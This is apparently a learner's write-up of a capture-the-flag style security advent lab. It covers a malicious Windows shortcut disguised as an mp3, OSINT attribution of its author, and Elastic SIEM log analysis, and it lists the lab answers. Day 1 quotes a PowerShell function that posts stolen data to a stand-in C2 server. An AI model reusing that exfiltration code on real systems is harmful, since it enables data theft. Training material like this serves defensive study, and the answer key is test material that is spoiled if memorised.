Day 1 - Maybe SOC-mas music, he thought, doesn't come from a store?
Learning Objectives
Learn how to investigate malicious link files.
Learn about OPSEC and OPSEC mistakes.
Understand how to track and attribute digital identities in cyber investigations.

 It’s about a youtube converting website claiming to be safe. After investigating the website, get a youtube link to convert it. Download the zipfile and there’s 2 file after extraction. using the “file” command to check the file’s contents. song.mp3 looks okay but the somg.mp3 looks very suspicious, the output of states that it an “MS Windows shortcut”. So, investigate more with exifTool, and there you can see that this file, somg.mp3, is pulls file from remote server and saves it in the target directory. Next, go to the remote server, ‘https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1‘, to see it’s content, you should be able to see who created it and the command and control server(c2 server)”:

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

To investigate more, google dork it, remote server shows that it’s githubuser, and we a string from the it, 
Created by the one and only M.M. site:github.com
$c2Url = "http://papash3ll.thm/data" site:github.com

https://github.com/MM-WarevilleTHM/M.M
This will show who M.M. = Mayor Malware

There you have it, with all that information, you successfully completed the learning objectives.


Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
Answer: Tyler Ramsbey

The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
Answer: http://papash3ll.thm/data

Who is M.M? Maybe his Github profile page would provide clues?
Answer: Mayor Malware

What is the number of commits on the GitHub repo where the issue was raised?
Answer: 1

===================================================

Day 2 - One man's false positive is another man's potpourri.
Tools:
elastic SIEM
cyberchef
change management system

Creds are given which is elastic:elastic, log in to elastic siem, 
pull up evens > open menu > select discover > click where it says "15 minutes ago" that is the from, select absolute , change date to Dec 1st, 2024 0900, click where it says "now", absolute change to same date 0930. That is same day and 30 mins of log.
Since we are looking for events related to PowerShell, we would like to know the following details about the logs. 

    The hostname where the command was run. We can use the host.hostname field as a column for that.
    The user who performed the activity. We can add the user.name field as a column for this information.
    We will add the event.category field to ensure we are looking at the correct event category.
    To know the actual commands run using PowerShell, we can add the process.command_line field.
    Finally, to know if the activity succeeded, we will add the event.outcome field.



What is the name of the account causing all the failed login attempts?
Answer: service_admin
How many failed logon attempts were observed?
Answer: 6791
What is the IP address of Glitch?
Answer: 10.0.255.1
When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS
Answer: Dec 1, 2024 08:54:39.000
What is the decoded command executed by Glitch to fix the systems of Wareville?
Answer: Install-WindowsUpdate -AcceptAll -AutoReboot

===================================================

Day 3 - Even if I wanted to go, their vulnerabilities wouldn't allow it.
























